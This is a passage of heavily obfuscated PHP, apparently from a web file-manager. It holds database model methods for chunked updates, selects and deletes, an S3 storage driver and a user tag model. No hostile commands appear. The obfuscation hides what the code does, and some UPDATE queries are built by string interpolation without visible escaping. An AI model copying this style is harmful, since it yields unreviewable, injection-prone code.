call_user_func_array($§…´°ü , $şáÌôÄ); } else { $õë²ŠØÌ[$¼ «ğ¨Í] = call_user_func_array(array(&$this, $§…´°ü ), $şáÌôÄ); } break; case $•Ó¨ÓØ³[358]: if (isset($õë²ŠØÌ[$¼ «ğ¨Í]) && $õë²ŠØÌ[$¼ «ğ¨Í]) { $õë²ŠØÌ[$¼ «ğ¨Í] = call_user_func_array(array(&$this, $ù–úì²Ã[1]), array($õë²ŠØÌ[$¼ «ğ¨Í])); } break; case $•Ó¨ÓØ³[361]: $õë²ŠØÌ[$¼ «ğ¨Í] = $õë²ŠØÌ[$ù–úì²Ã[1]]; break; case $•Ó¨ÓØ³[380]: if (isset($õë²ŠØÌ[$¼ «ğ¨Í]) && !is_string($õë²ŠØÌ[$¼ «ğ¨Í])) { $õë²ŠØÌ[$¼ «ğ¨Í] = json_encode_force($õë²ŠØÌ[$¼ «ğ¨Í]); } break; case $•Ó¨ÓØ³[409]: if ($õë²ŠØÌ[$¼ «ğ¨Í] === $•Ó¨ÓØ³[12]) { unset($õë²ŠØÌ[$¼ «ğ¨Í]); } break; case $•Ó¨ÓØ³[410]: $õë²ŠØÌ[$¼ «ğ¨Í] = $ù–úì²Ã[1]; default: break; } } if ($ÇÌû¼ == $•Ó¨ÓØ³[441]) { $êı‚Åˆ = strtolower($this->db->getDbType()); if (strpos($êı‚Åˆ, $•Ó¨ÓØ³[13]) !== 0) { return; } $Ê‹Š·İÈ = $this->field(!0)->fields; $ï¤Øìë¦ = $Ê‹Š·İÈ[$•Ó¨ÓØ³[340]]; if (isset($Ê‹Š·İÈ[$•Ó¨ÓØ³[339]])) { unset($ï¤Øìë¦[$Ê‹Š·İÈ[$•Ó¨ÓØ³[339]]]); } foreach ($ï¤Øìë¦ as $ôêÂì“è => $ÇÌû¼) { if (!isset($õë²ŠØÌ[$ôêÂì“è])) { $õë²ŠØÌ[$ôêÂì“è] = $•Ó¨ÓØ³[12]; } } } } private function dataAfterFilter(&$À¾ôºÂ) { $ë²³Œú¸ =& $_SERVER[´È¥ö†ö]; foreach ($this->dataAuto as $ªû— Ğ) { $Ò’Òğ÷¾ = $ªû— Ğ[0]; if (!isset($À¾ôºÂ[$Ò’Òğ÷¾])) { continue; } if (!in_array($ë²³Œú¸[443], explode($ë²³Œú¸[50], $ªû— Ğ[2]))) { continue; } switch (trim($ªû— Ğ[3])) { case $ë²³Œú¸[407]: case $ë²³Œú¸[408]: $öú¶«ğ = isset($ªû— Ğ[4]) ? (array) $ªû— Ğ[4] : array(); array_unshift($öú¶«ğ, $À¾ôºÂ[$Ò’Òğ÷¾]); if (isset($ªû— Ğ[4]) && $ªû— Ğ[4] == $ë²³Œú¸[464]) { $öú¶«ğ = array($À¾ôºÂ[$Ò’Òğ÷¾]); } if ($ë²³Œú¸[407] == $ªû— Ğ[3]) { $À¾ôºÂ[$Ò’Òğ÷¾] = call_user_func_array($ªû— Ğ[1], $öú¶«ğ); } else { $À¾ôºÂ[$Ò’Òğ÷¾] = call_user_func_array(array(&$this, $ªû— Ğ[1]), $öú¶«ğ); } break; case $ë²³Œú¸[358]: if (isset($À¾ôºÂ[$Ò’Òğ÷¾]) && $À¾ôºÂ[$Ò’Òğ÷¾]) { $À¾ôºÂ[$Ò’Òğ÷¾] = call_user_func_array(array(&$this, $ªû— Ğ[1]), array($À¾ôºÂ[$Ò’Òğ÷¾])); } break; case $ë²³Œú¸[361]: $À¾ôºÂ[$Ò’Òğ÷¾] = $À¾ôºÂ[$ªû— Ğ[1]]; break; case $ë²³Œú¸[380]: $ïıÚ©ËÂ = $À¾ôºÂ[$Ò’Òğ÷¾]; $À¾ôºÂ[$Ò’Òğ÷¾] = json_decode($ïıÚ©ËÂ, !0); if (is_null($À¾ôºÂ[$Ò’Òğ÷¾])) { $À¾ôºÂ[$Ò’Òğ÷¾] = $ïıÚ©ËÂ; } break; case $ë²³Œú¸[409]: if ($À¾ôºÂ[$Ò’Òğ÷¾] === $ë²³Œú¸[12]) { unset($À¾ôºÂ[$Ò’Òğ÷¾]); } break; case $ë²³Œú¸[410]: $À¾ôºÂ[$Ò’Òğ÷¾] = $ªû— Ğ[1]; break; default: break; } } } public function saveAll($ëğ¹À·—) { $ÁÌØ—Û =& $_SERVER[´È¥ö†ö]; $…»‹â‰´ = $this->tablePrefix . $this->tableName; $”òîæıÅ = self::SQL_WHERE_IN_CHUNK; $ëğ¹À·— = is_array($ëğ¹À·—) ? $ëğ¹À·— : array(); $àÜˆª¢Ÿ = $ÁÌØ—Û[465]; $øí›»÷Å = 0; $ıéŒëĞÔ = array(); $Ï¼ñ†úŞ = count($ëğ¹À·—); for ($ï‚áèÊ¿ = 0; $ï‚áèÊ¿ < $Ï¼ñ†úŞ; $ï‚áèÊ¿++) { $ªÛ×å†‡ = $ëğ¹À·—[$ï‚áèÊ¿]; if (!is_array($ªÛ×å†‡) || count($ªÛ×å†‡) != 4) { continue; } $Ë†ñù³¾ = "\x55\x50\x44\101\124\105\x20\140{$…»‹â‰´}\x60\40\123\x45\x54\x20{$ªÛ×å†‡[2]}\40\x3d\x20\103\101\x53\105\x20{$ªÛ×å†‡[0]}\x20\12"; if ($øí›»÷Å == 0) { $àÜˆª¢Ÿ = $Ë†ñù³¾; } $ıéŒëĞÔ[] = $ÁÌØ—Û[121] . $ªÛ×å†‡[1] . $ÁÌØ—Û[121]; $øí›»÷Å++; $àÜˆª¢Ÿ .= "\40\127\x48\105\x4e\x20\47{$ªÛ×å†‡[1]}\47\x20\124\x48\105\116\x20\47{$ªÛ×å†‡[3]}\x27\x20\12"; if ($øí›»÷Å == $”òîæıÅ || $ï‚áèÊ¿ == $Ï¼ñ†úŞ - 1) { $õ« ¥¸Ÿ = implode($ÁÌØ—Û[50], $ıéŒëĞÔ); $àÜˆª¢Ÿ .= "\40\x45\116\x44\x20\x20\127\110\x45\x52\105\40{$ªÛ×å†‡[0]}\x20\111\x4e\40\50{$õ« ¥¸Ÿ}\x29\x20"; $this->execute($àÜˆª¢Ÿ); $øí›»÷Å = 0; $àÜˆª¢Ÿ = $Ë†ñù³¾; $this->chunkEventCheck(count($ıéŒëĞÔ)); $ıéŒëĞÔ = array(); } } $this->chunkEventSet(); } public function saveAllEach($¸ÚÑ«ö¿) { $Ê¥ïÙé• =& $_SERVER[´È¥ö†ö]; $ò–ËÅŞ = $this->tablePrefix . $this->tableName; foreach ($¸ÚÑ«ö¿ as $Å¢¬âÍê) { if (!is_array($Å¢¬âÍê) || count($Å¢¬âÍê) != 4) { continue; } $Úöìô¿” = $Å¢¬âÍê[0] . $Ê¥ïÙé•[466] . $Å¢¬âÍê[1] . $Ê¥ïÙé•[121]; $˜ÀßÈˆó = $Å¢¬âÍê[2] . $Ê¥ïÙé•[466] . $Å¢¬âÍê[3] . $Ê¥ïÙé•[121]; $Øƒ—— = "\165\160\144\141\x74\145\40{$ò–ËÅŞ}\x20\163\145\x74\x20{$˜ÀßÈˆó}\x20\x77\150\145\162\145\x20{$Úöìô¿”}\73"; $this->execute($Øƒ——); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ÅØ˜´¼ = false, $õ¼ŠÇÛ• = false) { $this->_chunkEvent = $ÅØ˜´¼; $this->_chunkEventParam = $õ¼ŠÇÛ•; } private function chunkEventCheck($¢Öê­Øù) { if (!$this->_chunkEvent) { return; } $•ÄÁ¼ƒ¶ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $•ÄÁ¼ƒ¶[$_SERVER[´È¥ö†ö][467]] = $¢Öê­Øù; Hook::trigger($this->_chunkEvent, $•ÄÁ¼ƒ¶); } public function addAll($àÌ Å, $· ô«³Ú = array(), $œÀÕ×ùÙ = false) { $†éì«öË =& $_SERVER[´È¥ö†ö]; ignore_timeout(); $ğÆÊ¨ƒ = self::SQL_WHERE_IN_CHUNK; if (empty($àÌ Å)) { $this->error = think_lang($†éì«öË[359]); return !1; } $· ô«³Ú = $this->_parseOptions($· ô«³Ú); foreach ($àÌ Å as $£–³ÓÉ„ => $†°›åèú) { $àÌ Å[$£–³ÓÉ„] = $this->_facade($†°›åèú); $this->_beforeInsert($àÌ Å[$£–³ÓÉ„], $· ô«³Ú); } if (method_exists($this->db, $†éì«öË[360])) { for ($­èØ¿±î = 0; $­èØ¿±î < count($àÌ Å); $­èØ¿±î += $ğÆÊ¨ƒ) { $•ÚÈœ½· = array_slice($àÌ Å, $­èØ¿±î, $ğÆÊ¨ƒ); if (!is_array($•ÚÈœ½·) || count($•ÚÈœ½·) == 0) { break; } $ø­»Å…ß = $this->db->insertAll($•ÚÈœ½·, $· ô«³Ú, $œÀÕ×ùÙ); $this->chunkEventCheck(count($•ÚÈœ½·)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($àÌ Å as $£–³ÓÉ„ => $†°›åèú) { $ø­»Å…ß = $this->db->insert($†°›åèú, $· ô«³Ú, $œÀÕ×ùÙ); } $this->commit(); } if (!1 !== $ø­»Å…ß) { $Å£ùó¨¼ = $this->getLastInsID(); if ($Å£ùó¨¼) { return $Å£ùó¨¼; } } return $ø­»Å…ß; } public function save($ÖÎşúÙ = '', $òİº¯õñ = array()) { $Úö‚¡¶¾ =& $_SERVER[´È¥ö†ö]; $ÁàÀÎ­‡ = self::SQL_WHERE_IN_CHUNK; $·³ö“ÄÆ = $this->optionsValue(); $²¯ÊÖğ© = $this->findWhereField($·³ö“ÄÆ); if (!$²¯ÊÖğ©) { return parent::save($ÖÎşúÙ, $òİº¯õñ); } $íÎ¸¨¥ = 0; $èµÕ– = $·³ö“ÄÆ[$Úö‚¡¶¾[363]][$²¯ÊÖğ©][1]; $èµÕ– = is_array($èµÕ–) ? $èµÕ– : array(); $Î€çıú“ = count($èµÕ–); for ($ˆÎ…¸˜¡ = 0; $ˆÎ…¸˜¡ < $Î€çıú“; $ˆÎ…¸˜¡ += $ÁàÀÎ­‡) { $áü‰Š“Å = array_slice($èµÕ–, $ˆÎ…¸˜¡, $ÁàÀÎ­‡); if (!is_array($áü‰Š“Å) || count($áü‰Š“Å) == 0) { break; } $·³ö“ÄÆ[$Úö‚¡¶¾[363]][$²¯ÊÖğ©][1] = $áü‰Š“Å; $this->optionsValue($·³ö“ÄÆ); $íÎ¸¨¥ += parent::save($ÖÎşúÙ, $òİº¯õñ); $this->chunkEventCheck(count($áü‰Š“Å)); } $this->chunkEventSet(); return $íÎ¸¨¥; } public function add($ º—¸ı = '', $´ÒÙ‹æÔ = array(), $ÁæÑÉ¾§ = false) { if ($this->addTaskStatus && is_array($ º—¸ı)) { $this->addTaskData[] = $ º—¸ı; return; } return parent::add($ º—¸ı, $´ÒÙ‹æÔ, $ÁæÑÉ¾§); } public function parseWhereLike($ŸÓ¿ªùî, $·œ•­Ç = '', $ ø÷íçê = false, &$ŸËˆÏÔ = false) { $“¢ÚÛÆ =& $_SERVER[´È¥ö†ö]; $÷®”Æ¶¼ = $GLOBALS[$“¢ÚÛÆ[6]][$“¢ÚÛÆ[468]]; if (!$÷®”Æ¶¼[$“¢ÚÛÆ[469]]) { return $ŸÓ¿ªùî; } if (!is_array($ŸÓ¿ªùî)) { return $ŸÓ¿ªùî; } $éª¼ºù¾ = array(); $›ãŠ“µ© = 0; foreach ($ŸÓ¿ªùî as $¹›ÁôÑ­ => $šüÜ¢—â) { if (is_array($šüÜ¢—â) && count($šüÜ¢—â) == 2 && $šüÜ¢—â[0] == $“¢ÚÛÆ[470] && is_string($šüÜ¢—â[1]) && substr($šüÜ¢—â[1], 0, 1) == $“¢ÚÛÆ[471] && substr($šüÜ¢—â[1], strlen($šüÜ¢—â[1]) - 1, 1) == $“¢ÚÛÆ[471]) { $ŸËˆÏÔ = !0; $¡¿´Çùß = is_string($¹›ÁôÑ­) ? $¹›ÁôÑ­ : $·œ•­Ç; $•ÒÇö¶¹ = substr($šüÜ¢—â[1], 1, strlen($šüÜ¢—â[1]) - 2); $•ÒÇö¶¹ = $this->db->escapeString($•ÒÇö¶¹); if (!strpos($¡¿´Çùß, $“¢ÚÛÆ[10])) { $¡¿´Çùß = $“¢ÚÛÆ[472] . $¡¿´Çùß . $“¢ÚÛÆ[472]; } $Ì²‡£Ôë = $“¢ÚÛÆ[222] . $•ÒÇö¶¹ . $“¢ÚÛÆ[222]; $•ÒÇö¶¹ = str_replace(array($“¢ÚÛÆ[10], $“¢ÚÛÆ[473], $“¢ÚÛÆ[11]), $“¢ÚÛÆ[474], $•ÒÇö¶¹); if ($÷®”Æ¶¼[$“¢ÚÛÆ[475]]) { $Ì²‡£Ôë = $“¢ÚÛÆ[476] . $•ÒÇö¶¹ . $“¢ÚÛÆ[477]; if ($÷®”Æ¶¼[$“¢ÚÛÆ[478]]) { $Ì²‡£Ôë = $“¢ÚÛÆ[477] . $•ÒÇö¶¹ . $“¢ÚÛÆ[476]; } } $éª¼ºù¾[$›ãŠ“µ©] = $“¢ÚÛÆ[479] . $¡¿´Çùß . $“¢ÚÛÆ[480] . $Ì²‡£Ôë . $“¢ÚÛÆ[481]; $›ãŠ“µ©++; continue; } if (is_array($šüÜ¢—â)) { $·œ•­Ç = is_string($¹›ÁôÑ­) ? $¹›ÁôÑ­ : $·œ•­Ç; $šüÜ¢—â = $this->parseWhereLike($šüÜ¢—â, $·œ•­Ç, !0, $ŸËˆÏÔ); } if (is_numeric($¹›ÁôÑ­)) { $éª¼ºù¾[$›ãŠ“µ©] = $šüÜ¢—â; $›ãŠ“µ©++; } else { $éª¼ºù¾[$¹›ÁôÑ­] = $šüÜ¢—â; } } if ($ŸËˆÏÔ && !$ ø÷íçê) { } return $éª¼ºù¾; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($»ë’†’ = array()) { $øû§ÑÒ =& $_SERVER[´È¥ö†ö]; $»êÆ¿¡… = self::SQL_WHERE_IN_CHUNK; $˜ëâ‚î£ = $this->optionsValue(); $É‚á»‚Ù = $this->findWhereField($˜ëâ‚î£); if (!$É‚á»‚Ù || isset($˜ëâ‚î£[$øû§ÑÒ[378]]) || isset($˜ëâ‚î£[$øû§ÑÒ[439]])) { return parent::select($»ë’†’); } $ÍÅÏìåˆ = $˜ëâ‚î£[$øû§ÑÒ[363]][$É‚á»‚Ù][1]; $ÍÅÏìåˆ = is_array($ÍÅÏìåˆ) ? $ÍÅÏìåˆ : array(); $Ü«à×Ü¦ = null; for ($ÇÀÄ¡›· = 0; $ÇÀÄ¡›· < count($ÍÅÏìåˆ); $ÇÀÄ¡›· += $»êÆ¿¡…) { $îø„¦» = array_slice($ÍÅÏìåˆ, $ÇÀÄ¡›·, $»êÆ¿¡…); if (!is_array($îø„¦») || count($îø„¦») == 0) { break; } $˜ëâ‚î£[$øû§ÑÒ[363]][$É‚á»‚Ù][1] = $îø„¦»; $this->optionsValue($˜ëâ‚î£); $ìê»É = parent::select($»ë’†’); if (!$ìê»É) { continue; } $Ü«à×Ü¦ = is_array($Ü«à×Ü¦) ? $Ü«à×Ü¦ : array(); $Ü«à×Ü¦ = array_merge($Ü«à×Ü¦, $ìê»É); } return $Ü«à×Ü¦; } public function delete($ìøä† = array()) { $×ÄÛ±Ç© =& $_SERVER[´È¥ö†ö]; $–¬¦ÎÕ = self::SQL_WHERE_IN_CHUNK; $âîÎ = $this->optionsValue(); $“äÚˆŸ = $this->findWhereField($âîÎ); if (!$“äÚˆŸ) { return parent::delete($ìøä†); } $›ü€»Ëü = 0; $»ßñÑ¢ = $âîÎ[$×ÄÛ±Ç©[363]][$“äÚˆŸ][1]; $»ßñÑ¢ = is_array($»ßñÑ¢) ? $»ßñÑ¢ : array(); for ($Ï“¦ÅÅó = 0; $Ï“¦ÅÅó < count($»ßñÑ¢); $Ï“¦ÅÅó += $–¬¦ÎÕ) { $—ı¯öéî = array_slice($»ßñÑ¢, $Ï“¦ÅÅó, $–¬¦ÎÕ); if (!is_array($—ı¯öéî) || count($—ı¯öéî) == 0) { break; } $âîÎ[$×ÄÛ±Ç©[363]][$“äÚˆŸ][1] = $—ı¯öéî; $this->optionsValue($âîÎ); $›ü€»Ëü += parent::delete($ìøä†); } return $›ü€»Ëü; } private function findWhereField($¥€“Öò–) { $Öáäß‰ó =& $_SERVER[´È¥ö†ö]; $Ó³£ßáî = self::SQL_WHERE_IN_CHUNK; if (!is_array($¥€“Öò–) || !is_array($¥€“Öò–[$Öáäß‰ó[363]])) { return !1; } foreach ($¥€“Öò–[$Öáäß‰ó[363]] as $îüÏ´« => $ÓÒı˜íŞ) { if (is_array($ÓÒı˜íŞ) && isset($ÓÒı˜íŞ[0]) && is_string($ÓÒı˜íŞ[0]) && strtolower($ÓÒı˜íŞ[0]) == $Öáäß‰ó[7] && is_array($ÓÒı˜íŞ[1]) && count($ÓÒı˜íŞ[1]) > $Ó³£ßáî) { ignore_timeout(); return $îüÏ´«; } } return !1; } public function setMasterDB($¡öÍ…àğ = true) { think_config($_SERVER[´È¥ö†ö][482], $¡öÍ…àğ); } } goto C­Õ‘ÇŠíç; C•ÈÂÂõæ©: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ÂÜœ›ëŞ) { $Ğ£»Ü» =& $_SERVER[´È¥ö†ö]; parent::__construct($ÂÜœ›ëŞ); $Õ¡Õ²µİ = isset($ÂÜœ›ëŞ[$Ğ£»Ü»[258]]) && $ÂÜœ›ëŞ[$Ğ£»Ü»[258]] == $Ğ£»Ü»[249] ? $Ğ£»Ü»[249] : $Ğ£»Ü»[324]; $this->setSignVersion($Õ¡Õ²µİ); } public function link($òË¥ˆ©¤, $ººŒ˜æº = array()) { return parent::link($òË¥ˆ©¤, $ººŒ˜æº); } public function fileOut($À‡ãÓ‚, $¿Ï»”Æú = false, $æ¥¢û— = false, $„Õï‚–› = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[´È¥ö†ö][325])) { return parent::fileOutServer($À‡ãÓ‚, $¿Ï»”Æú, $æ¥¢û—, $„Õï‚–›); } parent::fileOut($À‡ãÓ‚, $¿Ï»”Æú, $æ¥¢û—, $„Õï‚–›); } public function fileOutImage($åÅŠ”Øë, $¡ç·¶·æ = 250) { if (strstr($this->endpoint, $_SERVER[´È¥ö†ö][325])) { return parent::fileOutImageServer($åÅŠ”Øë, $¡ç·¶·æ); } parent::fileOutImage($åÅŠ”Øë, $¡ç·¶·æ); } public function fileOutLink($ÉÖÕº´Æ) { $ÅÑ¹Ïš¦ =& $_SERVER[´È¥ö†ö]; if (substr($ÉÖÕº´Æ, 0, 7) == $ÅÑ¹Ïš¦[218]) { $ÉÖÕº´Æ = $ÅÑ¹Ïš¦[219] . substr($ÉÖÕº´Æ, 7); } header($ÅÑ¹Ïš¦[175] . $ÉÖÕº´Æ); die; } } define($_SERVER[´È¥ö†ö][326], 1); define($_SERVER[´È¥ö†ö][327], 2); goto CŠ’Ğ»ÎÊÌ; BƒçÁÃ¼: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\146\141\x76"; protected function cacheFunctionAlias($ı—ÁõÎˆ) { $Ù¾Æç =& $_SERVER[´È¥ö†ö]; return array($Ù¾Æç[2089] => array($Ù¾Æç[2512] . USER_ID, $Ù¾Æç[2090])); } protected function listData() { $Èë¡ÇÈ¢ =& $_SERVER[´È¥ö†ö]; $²£¨•äë = array($Èë¡ÇÈ¢[1764] => USER_ID, $Èë¡ÇÈ¢[568] => array($Èë¡ÇÈ¢[2093], 0)); $Á÷ù¸’¾ = $Èë¡ÇÈ¢[2513]; $ØßàÍ = $this->field($Á÷ù¸’¾)->where($²£¨•äë)->order($Èë¡ÇÈ¢[2096])->select(); return $ØßàÍ ? $ØßàÍ : array(); } protected function addToTag($Æ„£ãÊ, $Úë¶Æß ) { $ãÕŠ²ÃÅ =& $_SERVER[´È¥ö†ö]; if (!Model($ãÕŠ²ÃÅ[2242])->listData($Úë¶Æß )) { return !1; } if (is_numeric($Æ„£ãÊ)) { $³ëÔä´ù = Model($ãÕŠ²ÃÅ[901])->pathInfo($Æ„£ãÊ); if (!$³ëÔä´ù) { return !1; } } else { $³ëÔä´ù = IO::infoSimple($Æ„£ãÊ); if (!$³ëÔä´ù) { return !1; } $·®ó™Õƒ = $³ëÔä´ù[$ãÕŠ²ÃÅ[32]]; $öóÌƒÂÓ = $³ëÔä´ù[$ãÕŠ²ÃÅ[33]]; if (isset($³ëÔä´ù[$ãÕŠ²ÃÅ[496]])) { $öóÌƒÂÓ = $³ëÔä´ù[$ãÕŠ²ÃÅ[496]] == $ãÕŠ²ÃÅ[91] ? $ãÕŠ²ÃÅ[78] : $ãÕŠ²ÃÅ[232]; } } $±‘ÆùÅ« = array($ãÕŠ²ÃÅ[1764] => USER_ID, $ãÕŠ²ÃÅ[568] => $Úë¶Æß , $ãÕŠ²ÃÅ[506] => $Æ„£ãÊ, $ãÕŠ²ÃÅ[507] => $öóÌƒÂÓ ? $öóÌƒÂÓ : $ãÕŠ²ÃÅ[501], $ãÕŠ²ÃÅ[505] => $·®ó™Õƒ ? $·®ó™Õƒ : $ãÕŠ²ÃÅ[12], $ãÕŠ²ÃÅ[1978] => 0); if ($this->where($±‘ÆùÅ«)->find()) { return !1; } return $this->add($±‘ÆùÅ«); } protected function removeFromTag($åÀê–…š, $ô…›ˆ›) { $ÑêÒØõ½ =& $_SERVER[´È¥ö†ö]; if (!Model($ÑêÒØõ½[2242])->listData($ô…›ˆ›)) { return !1; } if (is_array($åÀê–…š)) { $åÀê–…š = array($ÑêÒØõ½[7], $åÀê–…š); } $ÆŞ‘õƒƒ = array($ÑêÒØõ½[1764] => USER_ID, $ÑêÒØõ½[568] => $ô…›ˆ›, $ÑêÒØõ½[506] => $åÀê–…š); return $this->where($ÆŞ‘õƒƒ)->delete(); } protected function removeByTag($€ÄÌŞ×æ) { $ø¸Í™Õ× =& $_SERVER[´È¥ö†ö]; if (!$€ÄÌŞ×æ) { return !1; } $İÅœ™‡Æ = array($ø¸Í™Õ×[1764] => USER_ID, $ø¸Í™Õ×[568] => $€ÄÌŞ×æ); return $this->where($İÅœ™‡Æ)->delete(); } protected function removeBySource($‘¡Ò¬¯İ) { $’ºÇ€Åò =& $_SERVER[´È¥ö†ö]; if (is_array($‘¡Ò¬¯İ)) { $‘¡Ò¬¯İ = array($’ºÇ€Åò[7], $‘¡Ò¬¯İ); } $ó¡ÜÜ¸º = array($’ºÇ€Åò[1764] => USER_ID, $’ºÇ€Åò[568] => array($’ºÇ€Åò[1090], 0), $’ºÇ€Åò[506] => $‘¡Ò¬¯İ); return $this->where($ó¡ÜÜ¸º)->delete(); } }